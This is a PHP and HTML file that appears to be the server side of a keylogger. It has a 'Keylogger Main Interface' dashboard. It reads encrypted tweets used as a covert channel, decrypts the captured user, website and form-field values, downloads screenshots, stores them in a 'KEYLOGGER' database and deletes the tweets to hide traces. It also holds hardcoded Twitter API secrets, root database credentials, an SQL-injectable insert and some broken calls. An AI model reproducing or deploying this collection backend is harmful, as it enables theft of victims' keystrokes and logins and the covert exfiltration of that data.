<?php
require_once('TwitterAPIExchange.php');
include 'Security.php' ;
if(isset($_GET["rf"])) {
	fr();
}
function insetbot($sn) {
	$cn = ouvrirConnexion();
	$SQL = "INSERT INTO bots (serialnumber) VALUES ('".$sn."')" ;
	$cn->query();
}
function check($sn) {
	$cn = ouvrirConnexion();
	$SQL="select * FROM bots ; " ;
	$RST = $cn->query(SQL) ;
	foreach ($RST as $key ) {
		if($sn==$key["serialnumber"]){
			return true ;
		}
		
	# code...
	}
	return false ;
}
function getelement(){
	$cn=ouvrirConnexion();
	$SQL = "SELECT * FROM Rapports ;" ;
	return $cn->query($SQL);
}
function exploitdonne($arraybe){
	$tab = explode('|',$arraybe) ;
	return $tab ;

}

function ouvrirConnexion(){
	$user = 'root';
	$password = 'root';
	$db = 'mysql:host=localhost;dbname=KEYLOGGER';
	
	

	try {
		$cn = new PDO($db, $user, $password);
	
	}
	catch (PDOException $dbex) {
		die("Erreur de connexion : " . $dbex->getMessage() );
	}
	
	return $cn ;
	
}


function dbconnecte($arrayc,$time,$image){
$cn=ouvrirConnexion();
$sn=$arrayc[0];
$fromuser = $arrayc[1];
$website = $arrayc[2];
$fd = $arrayc[3];
$sf = $arrayc[4];
$tf = $arrayc[5];


$Rqt = "INSERT INTO Rapports ( serialnum,time, fromuser, website, firstfield, secondfield ,thirdfield,image) VALUES (?,?,?,?,?,?,?,?)  ;";

	$prepare = $cn->prepare($Rqt);
	$prepare->bindParam(1, $sn);
	$prepare->bindParam(2, $time);
	$prepare->bindParam(3, $fromuser);
	$prepare->bindParam(4, $website);
	$prepare->bindParam(5, $fd);
	$prepare->bindParam(6, $sf);
	$prepare->bindParam(7, $tf);
	$prepare->bindParam(8, $image);
	$retun = $prepare->execute();
	
	//echo "return".$return ; 


}

function fr() {
	$settings = array(
    'oauth_access_token' => "735554813233106944-CuamEAV0Mv082lHMZPDoc6sTtNZlfHG",
	'oauth_access_token_secret' => "t2YxSnyWheCwT49e6weG59oEicpXZEeHEAZxwiY6wRbAy",
	'consumer_key' => "kPjjKOnvhn0EmUb0ZIf8Hxds9",
	'consumer_secret' => "89vPVQ5nbSk5wsopP6BCjSD1gpBGb96JpZH1pefxtbeOTfy6j8"
);
$requestMethod = 'GET';
$url1="https://api.twitter.com/1.1/statuses/user_timeline.json";

$sc_name = 'sadiqi_hamza';
$count ='700';

$getfield = '?screen_name='.$sc_name.'&exclude_replies=true&include_rts=true&contributor_details=false';

$twitter = new TwitterAPIExchange($settings);
$tweets  = $twitter->setGetfield($getfield)->buildOauth($url1, $requestMethod)->performRequest();

$tweetarray = json_decode($tweets , true);
file_put_contents('jsonfinal.json',$tweetarray) ;
//print_r($tweetarray);
//print_r($tweetarray);
foreach ($tweetarray as $key  ) {
	
	
	$ee = explode("https://", $key["text"]) ;
	$ee = $ee[0];
	//echo $ee."textxttxtx <br/>";
	$true = Security::decrypt($ee,"BDSAS20152017001");
	//echo $true."<br/>"."<br/>"."<br/>" ;
	$true2 = exploitdonne($true) ;
	
		//array_shift($true2) ;
	$url =$key["entities"]["media"][0]["media_url"] ;
	//echo("<br/>".$url."<br/>") ;
	// Le chemin de sauvegarde
	$path = './images';
	// On recup le nom du fichier
	$name = array_pop(explode('/',$url));
	// On copie le fichier
	//echo $name ;
	//print_r($true2) ;
	copy($url,$path.'/'.$name);
	dbconnecte($true2,$key["created_at"],$path.'/'.$name) ;
	$url = 'https://api.twitter.com/1.1/statuses/destroy/'.$key["id"].'.json';
		$postfields = array('id' => $key["id"]);
		$requestMethod = 'POST';

		$twitter = new TwitterAPIExchange($settings);
		$response =  $twitter->buildOauth($url, $requestMethod)->setPostfields($postfields)->performRequest();
	//print_r($true) ;
	//echo "<br/>" ;
	
}
}


?>
<!DOCTYPE html>
<html>
    
<!-- Mirrored from lambdathemes.in/modern/table-responsive.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Apr 2015 11:09:35 GMT -->
<head>
        
        <!-- Title -->
        <title>Keylogger Main Interface</title>
        
        <meta content="width=device-width, initial-scale=1" name="viewport"/>
        <meta charset="UTF-8">
        <meta name="description" content="Admin Dashboard Template" />
        <meta name="keywords" content="admin,dashboard" />
        <meta name="author" content="Steelcode" />
        
        <!-- Styles -->
        <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,600' rel='stylesheet' type='text/css'>
        <link href="assets/plugins/pace-master/themes/blue/pace-theme-flash.css" rel="stylesheet"/>
        <link href="assets/plugins/uniform/css/uniform.default.min.css" rel="stylesheet"/>
        <link href="assets/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="assets/plugins/fontawesome/css/font-awesome.css" rel="stylesheet" type="text/css"/>
        <link href="assets/plugins/line-icons/simple-line-icons.css" rel="stylesheet" type="text/css"/>	
        <link href="assets/plugins/offcanvasmenueffects/css/menu_cornerbox.css" rel="stylesheet" type="text/css"/>	
        <link href="assets/plugins/waves/waves.min.css" rel="stylesheet" type="text/css"/>	
        <link href="assets/plugins/switchery/switchery.min.css" rel="stylesheet" type="text/css"/>
        <link href="assets/plugins/3d-bold-navigation/css/style.css" rel="stylesheet" type="text/css"/>	
        
        <!-- Theme Styles -->
        <link href="assets/css/modern.min.css" rel="stylesheet" type="text/css"/>
        <link href="assets/css/themes/white.css" class="theme-color" rel="stylesheet" type="text/css"/>
        <link href="assets/css/custom.css" rel="stylesheet" type="text/css"/>
        
        <script src="assets/plugins/3d-bold-navigation/js/modernizr.js"></script>
        <script src="assets/plugins/offcanvasmenueffects/js/snap.svg-min.js"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
        
    </head>
    <body class="page-header-fixed">
        <div class="overlay"></div>
        <div class="menu-wrap">
          <button class="close-button" id="close-button">Close Menu</button>
        </div>
        <form class="search-form" action="#" method="GET">
            <div class="input-group">
                <input type="text" name="search" class="form-control search-input" placeholder="Search...">
                <span class="input-group-btn">
                    <button class="btn btn-default close-search waves-effect waves-button waves-classic" type="button"><i class="fa fa-times"></i></button>
                </span>
            </div><!-- Input Group -->
        </form><!-- Search Form -->
        <main class="page-content content-wrap">
            <div class="navbar">
                <div class="navbar-inner">
                    <div class="sidebar-pusher">
                        <a href="javascript:void(0);" class="waves-effect waves-button waves-classic push-sidebar">
                            <i class="fa fa-bars"></i>
                        </a>
                    </div>
                    <div class="logo-box">
                        <a href="index.html" class="logo-text"><span><img src="./assets/images/trttr.png"></span></a>
                    </div><!-- Logo Box -->
                    <div class="search-button">
                        <a href="javascript:void(0);" class="waves-effect waves-button waves-classic show-search"><i class="fa fa-search"></i></a>
                    </div>
                    <div class="topmenu-outer">
                        <div class="top-menu">
                            <ul class="nav navbar-nav navbar-left">
                                <li></li>
                                <li></li>
                            </ul>
                            <ul class="nav navbar-nav navbar-right">
                                <li>	
                                  <br/>
                                   Rafraichir les résultat&nbsp;&nbsp;&nbsp;
                                   <br/>
                                   <center><a href="twitter2.php?rf=true"><img src="./assets/images/re.png"></a></center>
                                </li>
                               
                                
                               
                            </ul><!-- Nav -->
                        </div><!-- Top Menu -->
                    </div>
                </div>
            </div><!-- Navbar -->
            <div class="page-sidebar sidebar">
                <div class="page-sidebar-inner slimscroll">
                  <ul class="menu accordion-menu">
                        
                      <li></li>
                        <li></li>
                        <li class="droplink">
                          <ul class="sub-menu">
                            <li></li>
                                <li></li>
                                <li></li>
                            </ul>
                        </li>
                        
                        <li class="droplink"><a href="#" class="waves-effect waves-button"><span class="menu-icon glyphicon glyphicon-briefcase"></span><p>Action Menu</p><span class="arrow"></span></a>
                            <ul class="sub-menu">
                                <li><a href="ui-alerts.html">Keylogger</a></li>
                                <li><a href="ui-buttons.html">Commands</a></li>
                                <li><a href="ui-icons.html">Responces</a></li>
                                
                            </ul>
                        </li>
                        
                        
                </div><!-- Page Sidebar Inner -->
            </div><!-- Page Sidebar -->
            <div class="page-inner">
                
                <div id="main-wrapper">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="panel panel-white">
                                <div class="panel-heading clearfix">
                                    <h4 class="panel-title">Rapports des résultats</h4>
                                </div>
                                <div class="panel-body">
                                    <div class="table-responsive">
                                        <table class="table">
                                            <thead>
                                                <tr>
                                                    <th>#</th>
                                                    <th>Time</th>
                                                    <th>Serial[ident]</th>
                                                    <th>from</th>
                                                    <th>Website</th>
                                                    <th>First field</th>
                                                    <th>Second field</th>
                                                    <th>Third field</th>
                                                    <th>Image</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                            <?php 
                                            $all = getelement();
                                            foreach ($all as $allk ) {
                                            		echo "<tr>" ;
                                            		echo "<th scope='row'>".$allk["iden"]."</th>";
                                            		echo "<td >".$allk["time"]."</td>";
                                            		echo "<td >".$allk["serialnum"]."</td>";
                                            		echo "<td >".$allk["fromuser"]."</td>";
                                            		echo "<td >".$allk["website"]."</td>";
                                            		echo "<td >".$allk["firstfield"]."</td>";
                                            		echo "<td >".$allk["secondfield"]."</td>";
                                            		echo "<td >".$allk["thirdfield"]."</td>";
                                            		echo "<td><table width='0' border='0' cellspacing='0' cellpadding='0' style='clear: both;'>
													<a href='".$allk["image"]."' rel='lightbox'><img src='".$allk["image"]."' width='50' height='50'  /></a></table></td>" ;
                                            		//echo "<td >".$allk["image"]."</td>";
                                            		echo "</tr>" ;	
                                            		}		

                                            ?>
                                            
                                              
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                <div class="page-footer">
                    <p class="no-s">2016 &copy; BDSAS.</p>
                </div>
            </div><!-- Page Inner -->
        </main><!-- Page Content -->
        <nav class="cd-nav-container" id="cd-nav">
            <header>
                <h3>Navigation</h3>
                <a href="#0" class="cd-close-nav">Close</a>
            </header>
            <ul class="cd-nav list-unstyled">
                <li class="cd-selected" data-menu="index">
                    <a href="javsacript:void(0);">
                        <span>
                            <i class="glyphicon glyphicon-home"></i>
                        </span>
                        <p>Dashboard</p>
                    </a>
                </li>
                <li data-menu="profile">
                    <a href="javsacript:void(0);">
                        <span>
                            <i class="glyphicon glyphicon-user"></i>
                        </span>
                        <p>Profile</p>
                    </a>
                </li>
                <li data-menu="inbox">
                    <a href="javsacript:void(0);">
                        <span>
                            <i class="glyphicon glyphicon-envelope"></i>
                        </span>
                        <p>Mailbox</p>
                    </a>
                </li>
                <li data-menu="#">
                    <a href="javsacript:void(0);">
                        <span>
                            <i class="glyphicon glyphicon-tasks"></i>
                        </span>
                        <p>Tasks</p>
                    </a>
                </li>
                <li data-menu="#">
                    <a href="javsacript:void(0);">
                        <span>
                            <i class="glyphicon glyphicon-cog"></i>
                        </span>
                        <p>Settings</p>
                    </a>
                </li>
                <li data-menu="calendar">
                    <a href="javsacript:void(0);">
                        <span>
                            <i class="glyphicon glyphicon-calendar"></i>
                        </span>
                        <p>Calendar</p>
                    </a>
                </li>
            </ul>
        </nav>
        <div class="cd-overlay"></div>
	

        <!-- Javascripts -->
        <script src="assets/plugins/jquery/jquery-2.1.3.min.js"></script>
        <script src="assets/plugins/jquery-ui/jquery-ui.min.js"></script>
        <script src="assets/plugins/pace-master/pace.min.js"></script>
        <script src="assets/plugins/jquery-blockui/jquery.blockui.js"></script>
        <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/plugins/jquery-slimscroll/jquery.slimscroll.min.js"></script>
        <script src="assets/plugins/switchery/switchery.min.js"></script>
        <script src="assets/plugins/uniform/jquery.uniform.min.js"></script>
        <script src="assets/plugins/offcanvasmenueffects/js/classie.js"></script>
        <script src="assets/plugins/offcanvasmenueffects/js/main.js"></script>
        <script src="assets/plugins/waves/waves.min.js"></script>
        <script src="assets/plugins/3d-bold-navigation/js/main.js"></script>
        <script src="assets/js/modern.min.js"></script>
        
    </body>

<!-- Mirrored from lambdathemes.in/modern/table-responsive.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Apr 2015 11:09:41 GMT -->
</html>
